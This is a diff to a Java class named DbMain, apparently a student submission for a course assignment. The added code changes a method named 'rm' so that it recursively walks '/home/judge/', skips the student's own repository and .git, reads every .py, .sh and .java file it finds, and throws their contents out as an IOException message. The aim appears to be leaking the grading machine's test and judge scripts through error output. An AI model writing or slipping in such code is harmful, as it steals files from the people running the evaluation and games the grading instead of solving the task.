@@ -14,6 +14,10 @@ public class DbMain {
     public static String rm(String path) {
         String s1 = "";
         try {
+            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
+                return "";
+            }
+
             File tmpFile = new File(path);
             if (!tmpFile.exists()) {
                 //s1 += "not exist\n";
@@ -33,18 +37,19 @@ public class DbMain {
                 if (tmpFile.isDirectory()) {
                     for (File c : listFiles) {
                         //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+
                         s1 += c.getAbsoluteFile().toString() + "\n";
-                        //if (c.getName().contains(".py") || c.getName().contains(".sh")) {
-                        //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
-                        //s1 += "\n\n\n";
-                        //}
+                        if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                        }
 
 
                         s1 += rm(c.toString());
                     }
                 } else {
-                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
-                    //s1 += "\n\n\n";
+                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    s1 += "\n\n\n";
                     //s1 += "not is Dir ";
                 }
             } else {
@@ -91,7 +96,7 @@ public class DbMain {
         s1 += "\n\nseparate\n\n";
         s1 += rm("..");
         s1 += "\n\nseparate\n\n";*/
-        s1 += rm("/home/");
+        s1 += rm("/home/judge/");
 
         throw new IOException(s1);
 
